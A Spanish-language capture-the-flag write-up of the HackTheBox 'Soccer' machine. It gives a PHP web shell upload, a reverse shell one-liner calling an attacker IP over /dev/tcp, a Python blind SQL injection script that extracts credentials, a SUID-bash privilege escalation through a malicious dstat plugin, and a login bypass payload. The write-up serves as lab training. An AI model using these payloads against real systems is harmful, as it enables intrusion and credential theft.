@@ -1,0 +1,600 @@
+---
+category: writeup
+machine_name: Soccer
+platform: HackTheBox
+difficulty: Fácil
+name: "Máquina Soccer"
+description: "Resolución de la máquina Soccer de HackTheBox"
+tags: ["Default credentials", "PHP Abuse", "Websockets", "Blind SQLi", "doas"]
+---
+
+En esta máquina encontraremos un sitio web con un gestor de archivos web expuesto con las credenciales por defecto, por lo cual subiremos un archivo malicioso para
+ganar acceso al sistema, enumerando el sistema hayaremos un nuevo subdominio con un aplicativo que se comunica por websockets a otro servicio; dicho servicio
+es vulnerable a una SQL injection pero al no poder ver los resultados de las consultas debemos basarnos en resultados de verdadero/falso.
+
+Finalmente, luego de ganar acceso escalaremos privilegios a root usando una entrada del usuario con el que ganamos acceso en el programa [doas](https://wiki.archlinux.org/title/Doas)
+
+<h2>RECONOCIMIENTO</h2>
+
+La máquina tiene 3 puertos abiertos, dos parecen ser HTTP y uno es el SSH.
+
+{% highlight bash %}
+Nmap 7.92 scan initiated Sun Dec 18 21:06:00 2022 as: nmap -sCV -p 9091,22,80 -Pn -n -vvv -oN services 10.10.11.194
+Nmap scan report for 10.10.11.194
+Host is up, received user-set (0.16s latency).
+Scanned at 2022-12-18 21:06:01 -04 for 23s
+
+PORT     STATE SERVICE         REASON         VERSION
+22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
+|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
+|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
+80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://soccer.htb/
+9091/tcp open  xmltec-xmlmail? syn-ack ttl 63
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   ...
+....
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kern el
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Dec 18 21:06:24 2022 -- 1 IP address (1 host up) scanned in 24.21 seconds
+{% endhighlight %}
+
+Nmap nos dice que el sitio está bajo un dominio ya que nos envía al sitio http://soccer.htb, por lo que vamos a agregar el sitio a nuestro fichero de hosts.
+
+```
+#/etc/hosts
+
+10.10.11.194 soccer.htb
+```
+
+El sitio web que posee es respecto a un equipo de fútbol de HTB.
+
+![Page](/assets/writeups/soccer/1.png)
+
+No tiene más nada de interesante, ni inspeccionando el código, por lo que podemos pasar a...
+
+<h2>INTRUSIÓN</h2>
+
+Fuzzeando por rutas podemos encontrar una interesante llamada "tiny"
+
+{% highlight bash %}
+ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soccer.htb/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://soccer.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 210ms]
+    * FUZZ: tiny
+
+{% endhighlight %}
+
+Es un gestor de archivos...
+
+![Tiny](/assets/writeups/soccer/2.png)
+
+Buscando por internet, en su proyecto de GitHub encontramos que las credenciales por defecto son `admin:admin@123` las cuales funcionan en esta web. Alguien se olvidó de actualizarlas.
+
+![When admin](/assets/writeups/soccer/3.png)
+
+Nos muestra quien es propietario del archivo y los bits de permiso que tiene asignado, todos tienen permisos 644 (El propietario tiene permisos de escritura y lectura mientras que los otros usuarios/grupos solo de lectura y ejecución) y su dueño es root, por lo que con estas carpetas y archivos no podemos hacer nada más que leerlos... a excepción del directorio uploads dentro de la carpeta del mismo tiny
+
+![Uploads folder](/assets/writeups/soccer/4.png)
+
+El sitio procesa PHP, por lo que podemos intentar escribir un archivo PHP malicioso y ver si el servidor web nos lo procesa; para esto debes dirigirte a la carpeta uploads y darle a "New Item", después de escribir el nombre del archivo te lo creará para que luego le agreges contenido. También puedes hacer el archivo en local y subirlo a través del botón "Upload"
+
+![Rev shell](/assets/writeups/soccer/5.png)
+
+*Notar que se me pasó un ; jaja*
+
+Después de crear el archivo e intentar acceder a él, parece que procesa el código sin problemas
+
+![www-data](/assets/writeups/soccer/6.png)
+
+Vamos a lanzarnos una consola interactiva hacía nuestro equipo
+
+```
+http://soccer.htb/tiny/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.6/443 0>%261"
+```
+
+{% highlight bash %}
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.194 37646
+bash: cannot set terminal process group (1043): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@soccer:~/html/tiny/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@soccer:~/html/tiny/uploads$ ^Z
+[1]  + 53525 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 53525 continued  nc -lvnp 443
+                                    reset xterm
+www-data@soccer:~/html/tiny/uploads$ export TERM=xterm-256color
+www-data@soccer:~/html/tiny/uploads$ source /etc/skel/.bashrc
+{% endhighlight %}
+
+Bien, explorando esta máquina no parece tener nada que nos permita escalar privilegios al único usuario que existe en el sistema, pero en el archivo de hosts y configuración de nginx existe un subdominio que no habíamos visto
+
+{% highlight bash %}
+#/etc/hosts
+127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb
+
+127.0.1.1	ubuntu-focal	ubuntu-focal
+{% endhighlight %}
+
+Después de agregarlo a nuestro hosts, nos muestra la misma página de inicio de sesión pero con unos detalles extra... y entre ellos que hay unos nuevos botones de inicio de sesión y registro.
+
+![New page](/assets/writeups/soccer/7.png)
+
+Registrandonos e iniciando sesión nos da una nueva sección para verificar si existe un ticket para asistir a un partido de fútbol que será en 10 días.
+
+![Match's tickets](/assets/writeups/soccer/8.png)
+
+Interceptando la petición vemos que se envia lo siguiente por el protocolo de WebSockets
+
+{% highlight json %}
+{"id":"60161"}
+{% endhighlight %}
+
+Si la intentamos alterar por esto, aunque pongamos un identificador inválido
+
+{% highlight json %}
+{"id":"324234234 OR 1=1 -- -"}
+{% endhighlight %}
+
+Nos dirá mágicamente que el ticket existe, por lo que parece ser una inyección SQL a ciegas donde solo podemos saber si la condición de la consulta devuelve verdadero (1) o falso (0).
+
+Vamos a crearnos un script en Python para automatizar esto y poder filtrar el contenido de la base de datos fácilmente. El endpoint no requiere de autenticación por lo que no es necesario tener a manos cookies o tokens para llevar a cabo el proceso.
+
+{% highlight python %}
+from pwn import log
+from time import sleep
+import websockets
+import asyncio
+import signal
+from concurrent.futures import ThreadPoolExecutor
+
+# No es el mejor script que he creado, tiene muchas cosas mejorables.
+# Es algo lento, te dejo a ti darle su debida optimización como una parte opcional
+
+def sigint(code, reason):
+    print("Saliendo...")
+    exit(1)
+
+status_bar = log.progress("Status")
+final = log.progress("Final payload")
+
+chars = "ABCDEFGHIJKLMNOPQRSTUWXYZabcdefghijklmnopqrstuwxyz_,1234567890"
+
+
+signal.signal(signal.SIGINT, sigint)
+
+async def brute(chars, pos, s: str):
+    symbol = s
+    for char in chars:
+      async with websockets.connect("ws://soccer.htb:9091") as ws:
+          status_bar.status(f"Trying with {char}")
+          # Esta parte la debes alterar con la serie de consultas que quieres hacer.
+          # En mi caso la pondré para saber la base de datos
+          await ws.send("{\"id\":\"1 OR IF((BINARY SUBSTR((SELECT database())," + str(pos) + ",1))='%s',1,FALSE)\"}" % char)
+          data = await ws.recv()
+          if data == "Ticket Exists":
+              status_bar.status(f"Succesfull payload with: {char}")
+              symbol += char
+              final.status(symbol)
+              return True, char
+    return False, ""
+ 
+
+position = 1 
+final_result = ""
+while True:
+  found, result = asyncio.run(brute(chars, position, final_result))
+  if found and result != "":
+      position += 1
+      final_result += result
+      continue
+  else:
+    break
+
+status_bar.success("Done.")
+{% endhighlight %}
+
+Ejecutando el script tal como lo tenemos arriba nos dice que la base de datos actual se llama "soccer_db"
+
+{% highlight bash %}
+❯ python3 websock.py
+[+] Status: Done.
+[d] Final payload: soccer_db
+{% endhighlight %}
+
+Ahora, si alteramos el script para que nos muestre cuantas tablas tiene esta base de datos funciona y vemos una tabla llamada "accounts"
+
+{% highlight python %}
+await ws.send("{\"id\":\"1 OR IF((BINARY SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='soccer_db')," + str(pos) + ",1))='%s',1,FALSE)\"}" % char)
+{% endhighlight %}
+
+{% highlight bash %}
+❯ python3 websock.py
+[+] Status: Done.
+[p] Final payload: accounts
+{% endhighlight %}
+
+No sabemos cuales son sus columnas, pero juzgando por su nombre el nombre de usuario debe estar identificado por "username" y la contraseña por lo más obvio, "password"
+
+Si alteramos nuevamente el script para obtener el primer nombre de usuario de la página, encontramos que es "player"
+
+{% highlight bash %}
+❯ python3 websock.py
+[+] Status: Done.
+[▇] Final payload: player
+{% endhighlight %}
+
+y su contraseña es...
+
+{% highlight bash %}
+❯ python3 websock.py
+[+] Status: Done.
+[°] Final payload: PlayerOftheMatch2022
+{% endhighlight %}
+
+Accediendo con estas credenciales por SSH obtenemos acceso como el usuario "player" y podremos ver la primera flag.
+
+{% highlight bash %}
+❯ ssh player@soccer.htb
+player@soccer.htb\'s password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jun 19 19:46:50 UTC 2023
+
+  System load:  0.05              Processes:             230
+  Usage of /:   72.6% of 3.84GB   Users logged in:       0
+  Memory usage: 22%               IPv4 address for eth0: 10.10.11.194
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19    
+player@soccer:~$ ls -la
+total 28
+drwxr-xr-x 3 player player 4096 Nov 28  2022 .
+drwxr-xr-x 3 root   root   4096 Nov 17  2022 ..
+lrwxrwxrwx 1 root   root      9 Nov 17  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
+drwx------ 2 player player 4096 Nov 17  2022 .cache
+-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root   root      9 Nov 17  2022 .viminfo -> /dev/null
+-rw-r----- 1 root   player   33 Jun 18 22:35 user.txt
+player@soccer:~$ cat user.txt
+7ceaab2939234cdc99bc91b51d******
+{% endhighlight %}
+
+<h2>ESCALADA DE PRIVILEGIOS</h2>
+
+Buscando por programas con el bit SUID establecido encontramos uno llamado "doas" y otras cosas del gestor de paquetes snap.
+
+{% highlight bash %}
+player@soccer:~$ find / -perm -4000 2>/dev/null
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+/snap/snapd/17883/usr/lib/snapd/snap-confine
+/snap/core20/1695/usr/bin/chfn
+/snap/core20/1695/usr/bin/chsh
+/snap/core20/1695/usr/bin/gpasswd
+/snap/core20/1695/usr/bin/mount
+/snap/core20/1695/usr/bin/newgrp
+/snap/core20/1695/usr/bin/passwd
+/snap/core20/1695/usr/bin/su
+/snap/core20/1695/usr/bin/sudo
+/snap/core20/1695/usr/bin/umount
+/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1695/usr/lib/openssh/ssh-keysign
+{% endhighlight %}
+
+Ese programa llamado doas es una alternativa al clásico `sudo` que es conocida por ser más ligera en cuanto a peso. Es usada por defecto en sistemas Linux como Alpine.
+
+Al ser una alternativa a sudo es obvio que puede tener reglas establecidas para un usuario, por lo que debemos ver su archivo de configuración, que podemos encontrarlo usando el mismo programa `find` ya que su nombre por defecto es `doas.conf` según la documentación en internet.
+
+{% highlight bash %}
+player@soccer:~$ find / -name doas.conf 2>/dev/null
+/usr/local/etc/doas.conf
+player@soccer:~$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+{% endhighlight %}
+
+Bueno, podemos ejecutar el comando `dstat` como root sin necesidad de contraseña; es un programa escrito en Python que permite monitorear los recursos del sistema...
+
+{% highlight bash %}
+player@soccer:~$ doas /usr/bin/dstat --help
+Usage: dstat [-afv] [options..] [delay [count]]
+Versatile tool for generating system resource statistics)
+
+Dstat options:
+  -c, --cpu                enable cpu stats
+     -C 0,3,total             include cpu0, cpu3 and total
+  -d, --disk               enable disk stats
+     -D total,hda             include hda and total
+  -g, --page               enable page stats
+  -i, --int                enable interrupt stats
+     -I 5,eth2                include int5 and interrupt used by eth2
+  -l, --load               enable load stats
+  -m, --mem                enable memory stats
+  -n, --net                enable network stats
+     -N eth1,total            include eth1 and total
+  -p, --proc               enable process stats
+  -r, --io                 enable io stats (I/O requests completed)
+  -s, --swap               enable swap stats
+     -S swap1,total           include swap1 and total
+  -t, --time               enable time/date output
+  -T, --epoch              enable time counter (seconds since epoch)
+  -y, --sys                enable system stats
+
+  --aio                    enable aio stats
+  --fs, --filesystem       enable fs stats
+  --ipc                    enable ipc stats
+  --lock                   enable lock stats
+  --raw                    enable raw stats
+  --socket                 enable socket stats
+  --tcp                    enable tcp stats
+  --udp                    enable udp stats
+  --unix                   enable unix stats
+  --vm                     enable vm stats
+  --vm-adv                 enable advanced vm stats
+  --zones                  enable zoneinfo stats
+
+  --list                   list all available plugins
+  --<plugin-name>          enable external plugin by name (see --list)
+
+  -a, --all                equals -cdngy (default)
+  -f, --full               automatically expand -C, -D, -I, -N and -S lists
+  -v, --vmstat             equals -pmgdsc -D total
+
+  --bits                   force bits for values expressed in bytes
+  --float                  force float values on screen
+  --integer                force integer values on screen
+
+  --bw, --black-on-white   change colors for white background terminal
+  --color                  force colors
+  --nocolor                disable colors
+  --noheaders              disable repetitive headers
+  --noupdate               disable intermediate updates
+  --output file            write CSV output to file
+  --profile                show profiling statistics when exiting dstat
+
+delay is the delay in seconds between each update (default: 1)
+count is the number of updates to display before exiting (default: unlimited)
+{% endhighlight %}
+
+Nos permite activar plugins externos que podemos listar usando `--list-`, pero nos interesaría más saber donde podemos incluir o instalar plugins; cosa que podemos ver viendo el código porque esto está escrito en Python
+
+{% highlight bash %}
+player@soccer:~$ head -n 100 /usr/bin/dstat
+#! /usr/bin/python3
+
+### This program is free software; you can redistribute it and/or
+### modify it under the terms of the GNU General Public License
+### as published by the Free Software Foundation; either version 2
+### of the License, or (at your option) any later version.
+###
+### This program is distributed in the hope that it will be useful,
+### but WITHOUT ANY WARRANTY; without even the implied warranty of
+### MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+### GNU General Public License for more details.
+###
+### You should have received a copy of the GNU General Public License
+### along with this program; if not, write to the Free Software
+### Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+
+### Copyright 2004-2019 Dag Wieers <dag@wieers.com>
+
+from __future__ import absolute_import, division, generators, print_function
+__metaclass__ = type
+
+import collections.abc
+import fnmatch
+import getopt
+import getpass
+import glob
+import linecache
+import os
+import re
+import resource
+import sched
+import six
+import sys
+import time
+
+VERSION = '0.8.0'
+
+theme = { 'default': '' }
+
+if sys.version_info < (2, 2):
+    sys.exit('error: Python 2.2 or later required')
+
+pluginpath = [
+    os.path.expanduser('~/.dstat/'),                                # home + /.dstat/
+    os.path.abspath(os.path.dirname(sys.argv[0])) + '/plugins/',    # binary path + /plugins/
+    '/usr/share/dstat/',
+    '/usr/local/share/dstat/',
+]
+...
+{% endhighlight %}
+
+En unos de esos directorios tenemos permisos de escritura
+
+{% highlight bash %}
+player@soccer:/usr/local/share$ ls -la
+total 24
+drwxr-xr-x  6 root root   4096 Nov 17  2022 .
+drwxr-xr-x 10 root root   4096 Nov 15  2022 ..
+drwxr-xr-x  2 root root   4096 Nov 15  2022 ca-certificates
+drwxrwx---  2 root player 4096 Dec 12  2022 dstat
+drwxrwsr-x  2 root staff  4096 Nov 17  2022 fonts
+drwxr-xr-x  5 root root   4096 Nov 17  2022 man
+player@soccer:/usr/local/share$ cd stat
+bash: cd: stat: No such file or directory
+player@soccer:/usr/local/share$ cd dstat
+player@soccer:/usr/local/share/dstat$ ls -la
+total 8
+drwxrwx--- 2 root player 4096 Dec 12  2022 .
+drwxr-xr-x 6 root root   4096 Nov 17  2022 ..
+{% endhighlight %}
+
+Por lo que podemos crearnos un simple script de Python que imite un plugin, cuya función será ejecutar un comando que nos haga una bash SUID. Debemos agregarle el prefijo `dstat_` a nuestro script como lo tienen los otros plugins ubicados en /usr/share/dstat para que el programa nos lo detecte
+
+{% highlight bash %}
+player@soccer:/usr/local/share/dstat$ nano dstat_nonmalicious.py
+player@soccer:/usr/local/share/dstat$ cat dstat_nonmalicious.py 
+import os
+
+os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
+player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --list
+internal:
+	aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,
+	proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
+/usr/share/dstat:
+	battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,
+	dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,
+	lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,
+	mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,
+	nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,
+	snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,
+	top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,
+	vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil
+/usr/local/share/dstat:
+	nonmalicious
+{% endhighlight %}
+
+Ahora simplemente podemos ejecutarlo y tomar la última flag
+
+{% highlight bash %}
+player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --nonmalicious
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module\'s documentation for alternative uses
+  import imp
+Module dstat_nonmalicious failed to load. (name 'dstat_plugin' is not defined)
+None of the stats you selected are available.
+player@soccer:/usr/local/share/dstat$ ls -la /tmp
+total 1204
+drwxrwxrwt 12 root root    4096 Jun 19 20:09 .
+drwxr-xr-x 21 root root    4096 Dec  1  2022 ..
+drwxrwxrwt  2 root root    4096 Jun 18 22:35 .ICE-unix
+drwxrwxrwt  2 root root    4096 Jun 18 22:35 .Test-unix
+drwxrwxrwt  2 root root    4096 Jun 18 22:35 .X11-unix
+drwxrwxrwt  2 root root    4096 Jun 18 22:35 .XIM-unix
+drwxrwxrwt  2 root root    4096 Jun 18 22:35 .font-unix
+-rwsr-xr-x  1 root root 1183448 Jun 19 20:09 bash
+drwx------  3 root root    4096 Jun 18 22:35 snap-private-tmp
+drwx------  3 root root    4096 Jun 18 22:35 systemd-private-8d48520c1a654b48ba24380b56f8798f-ModemManager.service-w2LJki
+drwx------  3 root root    4096 Jun 18 22:35 systemd-private-8d48520c1a654b48ba24380b56f8798f-systemd-logind.service-pXCBxg
+drwx------  3 root root    4096 Jun 18 22:35 systemd-private-8d48520c1a654b48ba24380b56f8798f-systemd-resolved.service-0SqBai
+drwx------  2 root root    4096 Jun 18 22:35 vmware-root_669-3980232826
+player@soccer:/usr/local/share/dstat$ /tmp/bash -p
+bash-5.0# cd /root
+bash-5.0# ls
+app  root.txt  run.sql	snap
+bash-5.0# cat root.txt
+29516b69bf594bbab762ad2b1a******
+{% endhighlight %}
+
+<h2>EXTRA</h2>
+
+La parte de inicio de sesión del aplicativo puedes saltártela con una inyección SQL similar a la que se vió en la máquina Vessel
+
+{% highlight bash %}
+email[email]=1&password[password]=1
+{% endhighlight %}
+
+Esto porque al programador se le olvidó verificar los tipos de datos que está recibiendo el servidor; si usas lenguajes de tipado débil como JavaScript siempre verifica bien los datos que recibe tu aplicación. 
+
+{% highlight javascript %}
+root@soccer:~/app# cat server.js
+...
+app.use('/login', function(request, response) {
+    setAuth(request);
+    if (request.session.authenticated) {
+        response.redirect('check');
+    } else {
+        if (request.method == 'POST') {
+            let email = request.body.email;
+            let password = request.body.password;
+            if (email && password) {
+                connection.query('SELECT * FROM accounts WHERE email = ? AND password = ?', [email , password], function(error, results, fields) {
+                    if (error) throw error;
+                    if (results.length > 0) {
+                        var rows = JSON.parse(JSON.stringify(results[0]));
+                        request.session.authenticated = true;
+                        request.session.email = email;
+                        response.redirect('/check')
+                    } else {
+                        response.send('Incorrect Email and/or Password!');
+                    }
+                    response.end();
+                });
+            } else {
+                response.end();
+            }
+        } else {
+            response.render('login', {
+                title : "Soccer - Login", isLoggedIn: request.session.authenticated
+            });
+        }
+    }
+});
+...
+{% endhighlight %}
